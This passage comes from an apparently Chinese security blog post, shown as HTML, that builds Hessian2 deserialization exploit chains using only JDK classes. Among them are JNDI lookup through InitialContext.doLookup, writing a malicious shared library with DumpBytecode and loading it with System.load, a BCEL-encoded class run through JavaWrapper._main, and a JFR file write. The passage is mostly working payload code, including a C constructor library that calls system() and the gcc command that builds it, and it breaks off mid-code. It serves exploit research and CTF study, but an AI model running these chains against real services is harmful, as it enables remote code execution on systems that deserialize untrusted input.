System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>((evilByte)));</span><br><span class="line">        hessian2Input.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="②InitalContext-doLookup"><a href="#②InitalContext-doLookup" class="headerlink" title="②InitalContext.doLookup"></a>②InitalContext.doLookup</h2><p>由于很多时候是高版本的jdk，所以很多时候必须需要依靠Tomcat的依赖进行绕过，如果没有Tomcat的依赖，可能会打不通。</p>
<p>学过高版本jdni注入，以下内容是众所周知的。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JDK 5U45,JDK 6U45,JDK 7u21,JDK 8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了<span class="literal">true</span>。</span><br><span class="line">JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了<span class="literal">false</span>。</span><br></pre></td></tr></table></figure></div>

<p>如果懒得进行绕过的话，可以手动关闭。本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：</p>
<p>System.setProperty，当然，一般情况下项目环境铁不会有这么好的设置就是了。</p>
<p>但是凑巧都是静态方法，我们可以通过反序列化使其自己执行，这里就打破了需要Tomcat和Spring的指定依赖的限制。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure></div>



<p>这个类的利用非常简单，本身就是一个静态方法，我们可以通过上面的总结很容易得出我们是可以去直接调用这个方法的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222211619476.png"
                      alt="image-20230222211619476"
                ></p>
<p>于是payload显而易见</p>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InitialContext_doLookup</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        java.lang.System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        java.lang.System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分四步发送，每一次反序列化都会报错退出，当然如果进行修改，不对其进行反序列化也可。但是还是得分四部发送。</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;java.rmi.server.useCodebaseOnly&quot;,&quot;false&quot;&#125;);</span></span><br><span class="line"><span class="comment">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;&#125;);</span></span><br><span class="line"><span class="comment">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(&quot;java.lang.System&quot;,&quot;setProperty&quot;,new String[]&#123;&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;&#125;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(<span class="string">&quot;javax.naming.InitialContext&quot;</span>,<span class="string">&quot;doLookup&quot;</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ldap://127.0.0.1:1389/vfylq9&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="③DumpBytecode-dumpBytecode-System-load"><a href="#③DumpBytecode-dumpBytecode-System-load" class="headerlink" title="③DumpBytecode.dumpBytecode + System.load"></a>③DumpBytecode.dumpBytecode + System.load</h2><p>该利用方法由发现者本人来说，是因为环境禁用了 <code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code> 而该类下存在一个写文件的方法，由于它被禁了，所以作者希望寻找一个是静态方法的方法，并且具有写文件的操作，去执行写文件。（我认为是想通过写入DLL，然后使用System.load去动态加载链接库）</p>
<p>如果这个类没被禁的话，其实可以直接使用它去写入文件的，看看该类的对应方法执行的操作</p>
<p>com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static void writeBytesToFilename(String filename, byte[] bytes) &#123;</span><br><span class="line">    if (filename != null &amp;&amp; bytes != null) &#123;</span><br><span class="line">        try (OutputStream outputStream = Files.newOutputStream(Paths.get(filename))) &#123;</span><br><span class="line">            outputStream.write(bytes);</span><br></pre></td></tr></table></figure></div>

<p>最终找到 <code>jdk.nashorn.internal.codegen.DumpBytecode#dumpBytecode</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222223152065.png"
                      alt="image-20230222223152065"
                ></p>
<p>参数都是可控的，可以写后缀为.class文件，并且目录不存在的话会创建目录</p>
<p>可以先写个小demo测试一下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.codegen.DumpBytecode;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ScriptEnvironment;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.logging.DebugLogger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DumpBytecode_dumpBytecode_System_load</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">script</span> <span class="operator">=</span> Reflections.createWithoutConstructor(ScriptEnvironment.class);</span><br><span class="line">        Object debug= Reflections.createWithoutConstructor(DebugLogger.class);</span><br><span class="line">        <span class="type">byte</span>[] code= <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        String classname=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(<span class="string">&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;</span>,<span class="string">&quot;dumpBytecode&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                script,</span><br><span class="line">                debug,</span><br><span class="line">                code,</span><br><span class="line">                classname</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是在使用的过程中其实能发现一个问题，在 SwingLazyValue 进行 createValue 操作时，会出’java.lang.ClassNotFoundException’异常。具体原因其实是类加载导致的问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222223021368.png"
                      alt="image-20230222223021368"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222223854166.png"
                      alt="image-20230222223854166"
                ></p>
<p>由于在使用 forName 进行类的获取时，ClassLoad选取为空，没有获得类加载器，导致无法加载该包外的其他类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222224154420.png"
                      alt="image-20230222224154420"
                ></p>
<p>而该 SwingLazyValue 类在 rt.jar 的包下，DumpBytecode类在 nashorn.jar 里面，所以导致加载不了，还需要再去寻找其他的类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222224404105.png"
                      alt="image-20230222224404105"
                ></p>
<p>最后找到<code>ProxyLazyValue.createValue</code></p>
<p>ProxyLazyValue 为 UIDefaults 的内部类，其 createValue 方法内容为</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230222225446664.png"
                      alt="image-20230222225446664"
                ></p>
<p>可以很清楚看到，这里通过线程获取到了当前的类加载器，然后通过该类加载器去执行了类加载的操作。除此以外由于 Hessian 序列化的机制，ProxyLazyValue里面的 field acc 是在反序列化过程中会报错 ， 所以需要将acc 反射设置为null。</p>
<p>我们可以写一个文件名为.class的.so文件，然后使用System.load加载（貌似这个load可以加载so文件(Linux下的程序函数库)和dll文件(动态链接库)），<font color="red"><strong>因为System.load不管后缀是什么都可以执行</strong></font></p>
<p>只需要将之前的链子里面的 SwingLazyValue 给换成  UIDefaults.ProxyLazyValue 即可。然后额外多一步就是去反射修改acc字段的值。</p>
<h3 id="生成恶意-so-文件"><a href="#生成恶意-so-文件" class="headerlink" title="生成恶意 so 文件"></a>生成恶意 so 文件</h3><p>里面的<code>__attribute__ ((__constructor__))</code> 是 gcc 的拓展，具体内容可以看看下面的内容</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zx_SSSS/article/details/79673610"><code>gcc扩展__attribute__((constructor))详解和在.a库中的使用方法</code></a></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__ ((__constructor__))  calc ()&#123;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c calc.c -o calc &amp;&amp; gcc calc --share -o calc.so</span><br></pre></td></tr></table></figure></div>



<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AnyStaticMethodExecute3</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 有局限性突破，可以加载任意静态类了</span></span><br><span class="line">        UIDefaults.<span class="type">ProxyLazyValue</span> <span class="variable">proxyLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>.ProxyLazyValue(className, methodName, args);</span><br><span class="line">        <span class="comment">// 反射修改 acc 的值为 null</span></span><br><span class="line">        Reflections.setFieldValue(proxyLazyValue, <span class="string">&quot;acc&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, proxyLazyValue);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">ml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        Reflections.setFieldValue(ml, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">        evilGenerate(ml);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ScriptEnvironment;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.logging.DebugLogger;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DumpBytecode_dumpBytecode_System_load</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">script</span> <span class="operator">=</span> Reflections.createWithoutConstructor(ScriptEnvironment.class);</span><br><span class="line">        <span class="comment">// 向 tmp 目录下写入文件</span></span><br><span class="line">        Reflections.setFieldValue(script,<span class="string">&quot;_dest_dir&quot;</span>,<span class="string">&quot;/tmp/&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">debug</span> <span class="operator">=</span> Reflections.createWithoutConstructor(DebugLogger.class);</span><br><span class="line">        <span class="comment">// 写入文件内容</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;./winCalc.so&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;</span>, <span class="string">&quot;dumpBytecode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                script,</span><br><span class="line">                debug,</span><br><span class="line">                code,</span><br><span class="line">                classname</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//System.load加载so文件，执行前将前面的内容注释掉，以为反序列化过程中会报错，不注释走不到这里</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;java.lang.System&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;/tmp/koishi.class&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后加载即可，**<font color="red">注意linux和windows生成的so文件存在区别</font>**</p>
<p>还需要注意一点：System.load 方法需要传入<font color="red"><strong>完整的文件路径</strong></font></p>
<p>windows 下测试用代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ScriptEnvironment;</span><br><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.logging.DebugLogger;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DumpBytecode_dumpBytecode_System_load</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">script</span> <span class="operator">=</span> Reflections.createWithoutConstructor(ScriptEnvironment.class);</span><br><span class="line">        <span class="comment">// 向 tmp 目录下写入文件</span></span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(script,&quot;_dest_dir&quot;,&quot;/tmp/&quot;);</span></span><br><span class="line">        Reflections.setFieldValue(script,<span class="string">&quot;_dest_dir&quot;</span>,<span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">debug</span> <span class="operator">=</span> Reflections.createWithoutConstructor(DebugLogger.class);</span><br><span class="line">        <span class="comment">// 写入文件内容</span></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\winCalc.so&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;jdk.nashorn.internal.codegen.DumpBytecode&quot;</span>, <span class="string">&quot;dumpBytecode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                script,</span><br><span class="line">                debug,</span><br><span class="line">                code,</span><br><span class="line">                classname</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//System.load加载so文件，执行前将前面的内容注释掉，以为反序列化过程中会报错，不注释走不到这里</span></span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute3(<span class="string">&quot;java.lang.System&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;R:\\languages\\Java\\study\\Hessian2\\src\\main\\java\\OnlyJDK\\evilFiles\\koishi.class&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223191542233.png"
                      alt="image-20230223191542233"
                ></p>
<h2 id="④JavaWrapper-mian"><a href="#④JavaWrapper-mian" class="headerlink" title="④JavaWrapper._mian"></a>④JavaWrapper._mian</h2><p>首先看看这个 <code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code> 类，先看看这个 <code>_main</code> 方法，它满足公开且静态。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223223229206.png"
                      alt="image-20230223223229206"
                ></p>
<p>继续跟进看其 runMain 方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223222905078.png"
                      alt="image-20230223222905078"
                ></p>
<p>该方法反射调用了指定 class 的”<code>_main</code>“方法，而该class_name 和 argv我们是可控的，我们只需要传入一个写好的_mian方法是恶意代码的类，即可执行任意命令。</p>
<p>然后加载类的操作是 <code>loader.loadClass(class_name)</code> ，而该类存在一个静态代码块，发现设置了类加载器为bcel加载器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230223225520755.png"
                      alt="image-20230223225520755"
                ></p>
<p>payload显然易见了，直接构造即可</p>
<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.evilFiles;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil_main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.evilFiles.Evil_main;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.JavaWrapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaWrapper_mian</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(Evil_main.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        Hessian2_OnlyJDK_Tool.AnyStaticMethodExecute1(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>,<span class="string">&quot;_main&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="⑤System-setProperty-writeGeneratedAsm-sun-security-tools-keytool-Main-main"><a href="#⑤System-setProperty-writeGeneratedAsm-sun-security-tools-keytool-Main-main" class="headerlink" title="⑤System.setProperty + writeGeneratedAsm + sun.security.tools.keytool.Main.main"></a>⑤System.setProperty + writeGeneratedAsm + sun.security.tools.keytool.Main.main</h2><p>这个操作稍微多点，首先利用漏洞通过写入 System.setProperty 设置 jfr.save.generated.asm 为 true，然后 jdk.jfr.internal.Utils.writeGeneratedAsm 将 jar 文件写入（该方法自动写入后缀为class的文件中，文件名可随意），这里就需要将恶意class文件打包成jar</p>
<p> 首先看 <code>jdk.jfr.internal.Utils</code> 下的 <code>writeGeneratedAsm</code> 方法 （java8没这玩意，测试11以上都有，9没试过，咨询过后了解到java 8应该是有这个东西的，但是直接看不到）</p>
<p>想看可以去 <a class="link"   target="_blank" rel="noopener" href="https://code.yawk.at/java/8/jdk/jfr/internal/Utils.java" >java&#x2F;8 : jdk&#x2F;jfr&#x2F;internal&#x2F;Utils.java (yawk.at) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（我这里是 java11 的内容，后续payload都是jdk8下使用的，为了看着方便，这里放这个截图）</p>
<p>（后来才发现，使用0ctf当时给的版本是可用的，版本为：openjdk 8u342，该版本下存在该类）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230224095800824.png"
                      alt="image-20230224095800824"
                ></p>
<p>这里有写文件操作。但是<code>SAVE_GENERATED</code> 默认为无，获取不到<code>SAVE_GENERATED</code>，就走不到后续内容。得去通过另一个静态方法改。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/#CVE-2021-21985" >VMware vCenter漏洞分析（一） - Blog (hosch3n.github.io-CVE-2021-21985) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>该文章中提到了这个类的漏洞使用方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230224101636714.png"
                      alt="image-20230224101636714"
                ></p>
<p>至此我们可以写入任意文件。（也可以利用这个写入上文提到的so文件，然后进行加载），这里我们使用另一个方式，写入一个jar包，通过jar包来执行任意命令。我们还需要去寻找一个类</p>
<p><code>sun.security.tools.keytool.Main</code>的 main 方法，其调用了本类的run方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> 